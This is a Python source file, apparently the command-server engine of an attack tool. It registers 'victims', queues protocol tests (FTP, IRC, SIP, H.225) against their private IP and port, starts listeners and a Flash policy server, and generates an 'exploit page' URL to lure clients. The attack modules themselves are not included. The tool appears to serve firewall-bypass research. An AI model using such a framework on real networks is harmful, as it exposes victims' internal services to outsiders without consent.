from modules import irc
from modules import ftp
from modules import flashpol
from modules import web
from modules import sip
from modules import h225
from datetime import datetime

#global imports
import asyncore
import thread
import urllib2


class Test():
	def __init__(self,test_type, public_ip,private_ip,private_port):
		self.TEST_TYPE=test_type.upper()			
		self.PUBLIC_IP=public_ip
		self.PRIVATE_IP=private_ip
		self.PRIVATE_PORT = private_port
		self.PUBLIC_PORT = "0"
		self.RESULT=False
		self.TEST_ID = self.createTestId()
		self.STATUS= "NEW"  #NEW, INPROGRESS or DONE
		self.TRANSPORT="" #TCP or UDP
	def createTestId(self):
		testid = str(datetime.now())
		testid = testid.replace("-","")
		testid = testid.replace(":","")
		testid = testid.replace(" ","")
		testid = testid.replace(".","")
		return testid
	def getTestString(self):
		#this is the command format as expected by the flash application
		if self.TEST_TYPE =="RELOAD":
			return "RELOAD"
		else:
			return "TEST " + self.TEST_TYPE + " " +  self.PRIVATE_IP + " " + self.PRIVATE_PORT + " " + self.TEST_ID
#end class
class Victim():
	def __init__(self,pub_ip,priv_ip,tests=None):
		self.PUBLIC_IP = pub_ip.strip()
		self.PRIVATE_IP= priv_ip.strip()
		#self.VIC_ID = self.PUBLIC_IP.replace(".","").replace(":","") + self.PRIVATE_IP.replace(".","").replace(":","")
		self.VIC_ID = self.PUBLIC_IP + "-" + self.PRIVATE_IP
		self.LAST_SEEN = datetime.now()	
		if tests != None: 
			self.TESTS=tests
		else:
			self.TESTS = []
	def addTest(self,proto, private_ip, private_port):
		loTest = Test(proto,self.PUBLIC_IP, private_ip,private_port)
		self.TESTS.append(loTest)
		return loTest.TEST_ID
	def _reload(self):
		self.TESTS.append(self.Test("RELOAD","","",""))
#end class



class Engine():
	"""Main class of this application, used as interface between user interaction part and back end sercvices
	which are the bread and buttor of this application
	"""			
	PROTOS=["FTP","IRC","SIP","H225"]	#supported protcols, shared over all instances
	def __init__(self, verbosity=0,getExtIp=False,logType="screen"):
		self.VICTIMS=[]
		self.SERVERS = []
		self.VERBOSITY = verbosity
		self.SERVICE_THREAD = None
		if getExtIp:
			self.PUBLIC_IP = self. getExternalIP()
		else:
			self.PUBLIC_IP = "SERVER_PUBLIC_IP"
		self.LOGTYPE = logType #either "screen" or filename
	#end def
	
	def getVictims(self):
		"""Retrieves Array of Victim objects from command server.
		Yields:
			array: array of victims or empty array when none are found
		"""
		return self.VICTIMS
	
	def registerVictim(self,connection,priv_ip):
		"""Validates wether the victim exists and appends it it VICTIMS[] if not
		Yields:
			string: victim id
		"""		
		vic = Victim(self.getRemotePeer(connection),priv_ip)
		vixexists = False
		for victim in self.VICTIMS:
			if victim.VIC_ID == vic.VIC_ID:
				vixexists=True
				break
		if vixexists != True:
			self.log("New client registered as " + vic.VIC_ID, 0)
			self.VICTIMS.append(vic)
		else:
			self.log("Client reconnected : " + vic.VIC_ID, 0)
		vic.LAST_SEEN = datetime.now()
		return vic.VIC_ID
	def getExternalIP(self):
		"""Calls remote page over HTTP to get external IP address, returns string"""
		self.log("Calling checkip.dns.com to determine external ip.",0)
		try:
			req = urllib2.urlopen('http://checkip.dyndns.com',None, 3)
			data = req.read().split(" ")
			sip = data[len(data)-1].strip()
			if sip.index("<")<= 1:
				sip = ""
			else:
				sip = sip[:sip.index("<")]
		except Exception,e:
			self.log("Failed to retrieve public IP from: http://checkip.dyndns.com: " + str(e.args[0]),1)
			sip =""
		if sip=="":
			#backup plan 
			try:
				self.log("Calling enabledns.com to determine external ip.",0)
				req = urllib2.urlopen('https://enabledns.com/ip',None,3)
				sip = req.read()
			except Exception, e:
				self.log("Failed to retrieve public IP from: https://enabledns.com/ip: " + str(e.args[0]),1)
				sip =""
		if not self.isValidIPv4(sip):
			self.log("getExternalIP(): Invalid IPv4 specification " + sip, 4)
			sip = ""
		return sip
	
	def getExploitPage(self):
		"""Generates example URL to use on clients"""
		sport = "80"
		sip = self.PUBLIC_IP
		if sip=="": sip = "External_Ip_Of_This_Host"
		for server in self.SERVERS:
			if server.TYPE=="Web Server":
				sport = str(server.PORT)
		return "http://"+sip+":"+sport+"/admin.html"
	
	def getVictimByVictimId(self,vicid):
		""""Gets victim based in the victim id (remip+privip)"""
		result=None
		for victim in self.VICTIMS:
			if victim.VIC_ID==vicid.strip():
				result=victim
				break
		return result
	
	def getVictimById(self,id):
		"""Retrieves specific victim from commandserver.victims.
		Args:
			id (int): index nr of victim in commandserver.VICTIMS array
		"""
		victims = self.getVictims()
		if victims != None:
			try:
				result = victims[int(id)]
			except IndexError:
				result = None #invalid list index
		else:	
			result = None
		return result
	
	def getVictimTest(self,testid):
		"""Retrieves specific test.
		Args:
			testid (string): test.TEST_ID; a unique identifier given to each test as defined in server/modules/cmd.py
		"""
		victims = self.getVictims()
		result = None
		if victims != None:
			for victim in victims:
				for test in victim.TESTS:
					if test.TEST_ID==testid:
						result = test
						break
		return result
	
	def getVictimByTestId(self,testid):
		"""Retrieves victim from loaded victims based on a certain testid.
		Args:
			testid (string): test.TEST_ID; a unique identifier given to each test as defined in server/modules/cmd.py
		"""
		victims = self.getVictims()
		if victims != None:
			for victim in victims:
				for test in victim.TESTS:
					if test.TEST_ID==testid:
						return victim
	
	def getRemotePeer(self,sock):
		"""Gets remote IP, strips of ipv6 prefix
		Args:
			sock: instance of asyncore.dispatcher
		"""
		tmp = sock.getpeername()[0]
		tmp = tmp.replace("::ffff:","")
		return tmp
	
	def log(self, value, logLevel):
		if logLevel <= self.VERBOSITY:
			print "\033[1;34m> "+value+"\033[1;m"
		#end if
	#end def
	
	def isValidPort(self,port):
		#check if given value is integer between 0 and 65535, return false if not
		try:
			iport = int(port)
			if iport >0 and iport <65536:
				return True
			else:
				return False
		except Exception, e:
			return False
	def isValidIPv4(self,sIP):
		sparts = sIP.split(".")
		#must have for parts
		if len(sparts)<>4:
			return False
		else:
			for part in sparts:
				if not part.isdigit():
					return False
				else:
					if int(part)>255 or int(part)<0:
						return False
		return True
	
	def isValidTestCommand(self,clientid,proto,ip,port,printError=False):
		"""Checks TEST command for validity. This is in engine class rather then in run.py as it is
		used both by run.py for command line interaction, as well as by the web service.
		"""
		result = False
		if not clientid.isdigit():
			if printError: print "You provided an invalid client id, type 'list clients' for a list of available clients."
			return False
		if self.getVictimById(clientid)==None:
			if printError: print "You provided an invalid client id, type 'list clients' for a list of available clients."
			return False
		if not port.isdigit():
			if printError: print "Invalid port specified. Allowed values: 1-65535"
			return False
		else:
			if int(port)<1 or int(port)>65535:
				if printError: print "Invalid port specified. Allowed values: 1-65535"
				return False
		if ip!="$":
			if len(ip.split("."))!=4:
				if printError: print("Only IPv4 IP addresses allowed at the moment")
				return False
		if not proto.upper() in self.PROTOS and proto.upper()!="ALL":
			if printError: print("You specified an invalid protocol.")
			return False		
		result = True #only gets here if all is well
		return result
	
	def getServicePort(self,serviceName):
		result = None
		for server in self.SERVERS:
			if server.sType.upper() == serviceName.strip().upper():
				result = server.PORT
		return result
	
	def runServers(self,runCMD,runWeb, runFlash, web_port,proto="ALL"):
		if (runWeb==True): self.SERVERS.append(web.Server(serverPort=web_port,caller=self))#required: flash policy server
		if (runFlash==True): self.SERVERS.append(flashpol.Server(serverPort=843,caller=self))
		if proto== "FTP" or proto== "ALL":
	        	self.SERVERS.append(ftp.Server(serverPort=21,caller=self))
		if proto== "IRC" or proto== "ALL":
			self.SERVERS.append(irc.Server(serverPort=6667,caller=self))
		if proto ==  "SIP" or proto==  "ALL":
			self.SERVERS.append(sip.Server(serverPort=5060,caller=self))
		if proto ==  "H225" or proto==  "ALL":
			self.SERVERS.append(h225.Server(serverPort=1720,caller=self))
		try:
			self.log("Services running",0)
			self.SERVICE_THREAD = thread.start_new_thread(asyncore.loop,()) #required!
		except KeyboardInterrupt:
			self.shutdown()
	#end def
	
	def shutdown(self):
		for server in self.SERVERS:
			server.stop()
		self.SERVICE_THREAD = None
	#end def
#end class
